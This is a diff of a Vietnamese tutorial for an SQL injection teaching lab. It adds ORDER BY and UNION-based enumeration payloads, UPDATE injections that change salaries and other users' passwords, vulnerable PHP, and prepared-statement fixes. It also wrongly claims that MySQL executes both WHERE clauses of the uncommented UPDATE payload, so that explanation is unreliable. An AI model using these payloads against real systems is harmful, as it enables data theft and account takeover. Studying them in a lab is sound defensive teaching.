@@ -108,6 +108,89 @@ Hàm `database()` trong MySQL trả về tên của database hiện tại. Kết
 - Kiểu dữ liệu của các cột tương ứng phải tương thích
 - Cần biết số cột của bảng gốc (có thể dùng `ORDER BY` để tìm)
 
+**Cách tìm số cột bằng ORDER BY:**
+
+Kỹ thuật ORDER BY được sử dụng để xác định số cột trong bảng. Nguyên lý:
+- `ORDER BY n` sắp xếp kết quả theo cột thứ n
+- Nếu n lớn hơn số cột thực tế, sẽ có lỗi SQL
+
+**Ví dụ:**
+```sql
+-- Thử với cột 1
+SELECT * FROM products WHERE name LIKE '%' ORDER BY 1 #%'
+-- Kết quả: Thành công
+
+-- Thử với cột 2
+SELECT * FROM products WHERE name LIKE '%' ORDER BY 2 #%'
+-- Kết quả: Thành công
+
+-- Thử với cột 5
+SELECT * FROM products WHERE name LIKE '%' ORDER BY 5 #%'
+-- Kết quả: Lỗi "Unknown column '5' in 'order clause'"
+-- Kết luận: Bảng products có 4 cột (1, 2, 3, 4)
+```
+
+**Cách tìm tên cột:**
+
+Sau khi biết số cột, cần tìm tên cột để UNION SELECT đúng:
+1. **Dựa vào error message:** Nếu có error-based SQL injection, lỗi có thể hiển thị tên cột
+2. **Thử các tên cột phổ biến:** id, name, username, email, password, etc.
+3. **Sử dụng information_schema:** 
+   ```sql
+   ' UNION SELECT column_name, 2, 3, 4 FROM information_schema.columns WHERE table_name='users' #
+   ```
+4. **Thử với số:** `' UNION SELECT 1, 2, 3, 4 FROM users #` để xem có bao nhiêu cột trong users
+
+**Ví dụ payload hoàn chỉnh:**
+```sql
+-- Bước 1: Tìm số cột
+' ORDER BY 4 #  -- Thành công
+' ORDER BY 5 #  -- Lỗi => Bảng có 4 cột
+
+-- Bước 2: UNION với bảng users (cần biết users cũng có 4 cột hoặc chọn 4 cột từ users)
+' UNION SELECT id, username, email, role FROM users #
+```
+
+### 3.4 UPDATE Statement SQL Injection
+
+**Payload:** `', salary=99999.00 WHERE username='alice`
+
+**Cách hoạt động:**
+
+Câu SQL ban đầu trong trang Edit Profile:
+```php
+$sql = "UPDATE users SET nickname='$nickname', email='$email', address='$address', phone='$phone' WHERE username='$current_user'";
+```
+
+Sau khi nhập payload vào trường nickname:
+```sql
+UPDATE users SET nickname='', salary=99999.00 WHERE username='alice', email='...', address='...', phone='...' WHERE username='alice'
+```
+
+**Giải thích:**
+- Payload chèn thêm điều kiện `salary=99999.00 WHERE username='alice'` vào phần SET
+- Điều này tạo ra hai mệnh đề WHERE (một trong SET, một ở cuối), nhưng MySQL sẽ thực thi cả hai phần
+- Kết quả: Salary của user 'alice' được cập nhật thành $99999.00
+
+**Payload để modify other people's data:**
+```sql
+', salary=1.00 WHERE username='boby' -- 
+```
+
+Dấu `--` comment phần sau, chỉ thực thi phần UPDATE salary của Boby.
+
+**Payload để modify password:**
+```sql
+', password='aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d' WHERE username='boby' -- 
+```
+
+Password được lưu dưới dạng SHA1 hash. Kẻ tấn công cần tính toán hash của password mới trước khi chèn vào.
+
+**Nguy hiểm của UPDATE Injection:**
+- Có thể sửa đổi dữ liệu của chính mình (như tăng lương)
+- Có thể sửa đổi dữ liệu của người khác (giảm lương, đổi password)
+- Có thể bypass các kiểm soát truy cập (ví dụ: không được phép sửa salary nhưng vẫn sửa được)
+
 ## 4. Cấu trúc của ứng dụng demo
 
 ### 4.1 Kiến trúc Docker
@@ -123,8 +206,12 @@ Hai container giao tiếp với nhau qua Docker network. Container web kết n�
 **Bảng users:**
 - `id`: INT AUTO_INCREMENT PRIMARY KEY
 - `username`: VARCHAR(50) NOT NULL UNIQUE
-- `password`: VARCHAR(100) NOT NULL
+- `password`: VARCHAR(100) NOT NULL (lưu dưới dạng SHA1 hash)
 - `email`: VARCHAR(100)
+- `nickname`: VARCHAR(50)
+- `address`: TEXT
+- `phone`: VARCHAR(20)
+- `salary`: DECIMAL(10, 2) DEFAULT 0.00
 - `role`: VARCHAR(20) DEFAULT 'user'
 - `created_at`: TIMESTAMP
 
@@ -207,9 +294,18 @@ SQL Injection cho phép kẻ tấn công đọc dữ liệu từ database:
 ### 6.3 Data Manipulation (Thao tác dữ liệu)
 
 Nếu ứng dụng có quyền ghi, kẻ tấn công có thể:
-- Sửa đổi dữ liệu (UPDATE)
+- Sửa đổi dữ liệu (UPDATE) - Đã được demo trong trang Edit Profile
+  - Tăng lương của chính mình
+  - Giảm lương của người khác
+  - Đổi password của người khác để chiếm quyền truy cập
 - Xóa dữ liệu (DELETE)
 - Thêm dữ liệu giả mạo (INSERT)
+
+**Ví dụ cụ thể từ demo:**
+- SQL Injection trên UPDATE statement cho phép kẻ tấn công bypass các kiểm soát truy cập
+- Trang Edit Profile chỉ cho phép sửa nickname, email, address, phone, password
+- Nhưng với SQL Injection, kẻ tấn công có thể sửa cả salary (mà đáng lẽ không được phép)
+- Thậm chí có thể sửa dữ liệu của người khác bằng cách thay đổi điều kiện WHERE
 
 ### 6.4 Database Schema Manipulation
 
@@ -275,13 +371,13 @@ Kẻ tấn công sử dụng kênh khác để nhận dữ liệu (DNS, HTTP req
 
 Đây là biện pháp phòng chống hiệu quả nhất. Thay vì nối chuỗi, sử dụng placeholder:
 
-**Code không an toàn (như trong demo):**
+**Code không an toàn (như trong demo - trang index.php):**
 ```php
 $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
 $result = $conn->query($sql);
 ```
 
-**Code an toàn với Prepared Statements:**
+**Code an toàn với Prepared Statements (như trong demo - trang defense.php):**
 ```php
 $stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
 $stmt->bind_param("ss", $username, $password);
@@ -289,10 +385,29 @@ $stmt->execute();
 $result = $stmt->get_result();
 ```
 
+**Code không an toàn cho UPDATE (như trong demo - trang profile.php):**
+```php
+$sql = "UPDATE users SET nickname='$nickname', email='$email', address='$address', phone='$phone' WHERE username='$current_user'";
+$result = $conn->query($sql);
+```
+
+**Code an toàn cho UPDATE với Prepared Statements:**
+```php
+$stmt = $conn->prepare("UPDATE users SET nickname=?, email=?, address=?, phone=? WHERE username=?");
+$stmt->bind_param("sssss", $nickname, $email, $address, $phone, $current_user);
+$stmt->execute();
+```
+
 Với Prepared Statements:
 - Câu SQL được compile trước, cấu trúc câu SQL không thể thay đổi
 - Dữ liệu được truyền vào như tham số, không phải như một phần của câu SQL
 - Database tự động escape các ký tự đặc biệt trong dữ liệu
+- Ngăn chặn cả SELECT và UPDATE injection
+
+**Demo trong ứng dụng:**
+- Trang `index.php` và `profile.php`: Dễ bị SQL Injection (string concatenation)
+- Trang `defense.php`: An toàn với SQL Injection (Prepared Statement)
+- Có thể so sánh trực tiếp bằng cách thử cùng một payload trên cả hai trang
 
 ### 8.2 Input Validation
 
@@ -320,9 +435,36 @@ Không hiển thị thông báo lỗi SQL chi tiết cho người dùng:
 
 WAF có thể chặn các request chứa payload SQL Injection phổ biến. Tuy nhiên, WAF không phải giải pháp hoàn hảo và có thể bị bypass.
 
-## 9. Kết luận
+## 9. Các tính năng demo trong ứng dụng
+
+### 9.1 Trang Login (index.php)
+- SQL Injection trên SELECT statement
+- Demo các kỹ thuật: Comment-based, OR-based
+- Hiển thị câu SQL để minh họa
+
+### 9.2 Trang Search (search.php)
+- SQL Injection trên SELECT statement với LIKE
+- Demo UNION-based injection để đọc dữ liệu từ database
+- Có thể dùng với sqlmap để tự động khai thác
+
+### 9.3 Trang Edit Profile (profile.php)
+- SQL Injection trên UPDATE statement
+- Demo modify own salary, modify other people's salary và password
+- Minh họa nguy hiểm của UPDATE injection
+
+### 9.4 Trang Defense (defense.php)
+- Sử dụng Prepared Statement để ngăn chặn SQL Injection
+- So sánh với các trang vulnerable
+- Chứng minh Prepared Statement là giải pháp hiệu quả
+
+## 10. Kết luận
 
 SQL Injection là một lỗ hổng nghiêm trọng nhưng hoàn toàn có thể phòng chống được. Nguyên nhân chính là do lập trình viên không xử lý đúng cách dữ liệu đầu vào. Biện pháp phòng chống hiệu quả nhất là sử dụng Prepared Statements, kết hợp với input validation và nguyên tắc least privilege.
 
-Demo này minh họa cách SQL Injection hoạt động trong môi trường thực tế, giúp hiểu rõ hơn về mức độ nguy hiểm và tầm quan trọng của việc viết code an toàn.
+Demo này minh họa cách SQL Injection hoạt động trong môi trường thực tế, bao gồm:
+- SQL Injection trên SELECT statement (login bypass, data disclosure)
+- SQL Injection trên UPDATE statement (data manipulation)
+- Cách phòng chống bằng Prepared Statement
+
+Giúp hiểu rõ hơn về mức độ nguy hiểm và tầm quan trọng của việc viết code an toàn.
 
